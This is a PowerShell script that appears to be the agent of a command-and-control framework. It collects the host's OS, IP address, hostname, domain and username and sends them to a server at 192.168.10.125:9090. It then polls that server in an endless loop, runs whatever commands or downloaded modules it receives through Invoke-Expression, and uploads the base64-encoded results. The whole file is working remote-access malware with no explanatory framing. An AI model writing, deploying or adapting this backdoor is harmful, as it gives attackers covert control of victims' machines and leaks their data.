$hostname = $env:COMPUTERNAME;
$whoami = $env:USERNAME;
$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
$domain = (Get-WmiObject Win32_ComputerSystem).Domain;
$IP = (gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$random = -join ((65 .. 90) | Get-Random -Count 5 | % { [char]$_ });
$agent = "$random-img.jpeg"
$finaldata = "$os**$IP**$arch**$hostname**$domain**$whoami"
$h3 = new-object net.WebClient
$h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
$h = $h3.UploadString("http://192.168.10.125:9090/info/$agent", "data="+$finaldata)

$h2 = New-Object system.Net.WebClient;
$h3 = New-Object system.Net.WebClient;


function load($module)
{
	
	
	
	$handle = new-object net.WebClient;
	$handleh = $handle.Headers;
	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
	$modulecontent = $handle.UploadString("http://192.168.10.125:9090/md/$agent", "$module");
	
	
	
	return $modulecontent
}



while ($true)
{
	$cmd = $h2.downloadString("http://192.168.10.125:9090/cm/$agent");
	#echo $cmd
	if ($cmd -eq "REGISTER")
	{
		$h3 = new-object net.WebClient
		$h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
		$h3.UploadString("http://192.168.10.125:9090/info/$agent", "data="+$finaldata)
		continue
	}
	if ($cmd -eq "")
	{
		sleep 2
		continue
	}
	elseif ($cmd.split(" ")[0] -eq "load")
	{
		$f = $cmd.split(" ")[1]
		$module = load -module $f
		try
		{
			$output = Invoke-Expression ($module) | Out-String
		}
		catch
		{
			$output = $Error[0] | Out-String;
		}
		
		
	}
	
	else
	{
		
		try
		{
			$output = Invoke-Expression ($cmd) | Out-String
		}
		catch
		{
			#$output = $Error[0] | Out-String;
		}
	}
    Echo $output
	$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
	$redata = [System.Convert]::ToBase64String($bytes)
    $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
	$re = $h3.UploadString("http://192.168.10.125:9090/re/$agent", "data="+$redata);
	
}
